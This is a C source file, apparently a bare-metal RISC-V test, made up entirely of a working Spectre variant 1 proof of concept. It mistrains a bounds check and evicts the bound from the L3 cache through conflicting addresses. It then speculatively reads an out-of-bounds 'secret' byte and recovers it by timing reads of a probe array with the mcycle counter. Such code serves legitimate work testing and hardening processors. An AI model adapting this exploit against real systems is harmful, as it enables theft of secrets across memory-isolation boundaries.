#include <stdint.h>
#include <klib.h>

unsigned int array1_size = 4;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4};
uint8_t unused2[64];
uint8_t array2[256 * 64];
uint8_t unused3[64];
char secret = 'G';
uint8_t unused4[64];
uint8_t result[256];

void victim(size_t x) {
    uint8_t dummy;
    if (x < array1_size) {
        dummy = array2[array1[x] * 64];
    }
    (void)dummy;
}

#define L3_SETS 1024
#define L3_SET_BITS 10
#define L3_WAYS 8
#define L3_BLOCK_SIZE 64
#define L3_BLOCK_BITS 6
#define L3_SIZE (L3_SETS * L3_WAYS * L3_BLOCK_SIZE)
#define FULL_MASK 0xFFFFFFFFFFFFFFFF
#define L3_OFF_MASK (~(FULL_MASK << L3_BLOCK_BITS))
#define L3_TAG_MASK (FULL_MASK << (L3_SET_BITS + L3_BLOCK_BITS))
#define L3_SET_MASK (~(L3_TAG_MASK | L3_OFF_MASK))

uint8_t confliction_mem[8 * L3_SIZE];

void flush_cache(void* addr) {
    uint8_t dummy;
    uint64_t aligned_cmem = (((uint64_t)&confliction_mem) + L3_SIZE) & L3_TAG_MASK;

    uint64_t set_offset = (((uint64_t)addr & L3_SET_MASK) >> L3_BLOCK_BITS) << L3_BLOCK_BITS;

    for(uint64_t i = 0; i < 4 * L3_WAYS; i++){
        uint64_t way_offset = i << (L3_BLOCK_BITS + L3_SET_BITS);
        dummy = *((volatile uint8_t*)(aligned_cmem + set_offset + way_offset));
    }

    (void)dummy;
}

uint64_t timed_read(volatile uint8_t *addr) {
    uint64_t dummy;
    uint64_t time_start, time_end;

    asm volatile ("csrr %0, mcycle": "=r"(time_start));
    dummy = *addr;
    asm volatile ("csrr %0, mcycle": "=r"(time_end));

    (void)dummy;
    return time_end - time_start;
}

#define HIT_THRESHOLD 30

int main() {
    size_t legal_x = 2;
    size_t malicious_x = (size_t)(&secret - (char*)array1);

    for (int i = 0; i < 30; i++) {
        flush_cache(&array1_size);
        for (volatile int j = 0; j < 100; j++) {}

        size_t mask_high = ((i % 6) - 1) & 0xFFFF0000;
        size_t mask_full = (mask_high | (mask_high >> 16));
        size_t x = legal_x ^ (mask_full & (malicious_x ^ legal_x));

        victim(x);
    }

    for (int i = 0; i < 256; i++) {
        int mix_i = ((i * 167) + 13) & 255;
        volatile uint8_t *addr = &array2[mix_i * 64];
        result[mix_i] += timed_read(addr);
    }

    printf("Possible value(s) of secret: ");
    for (int i = 0; i < 256; i++) {
        if (result[i] < HIT_THRESHOLD) {
            printf("'%c'(%d), ", i, i);
        }
    }
    printf("\n");

    return 0;
}
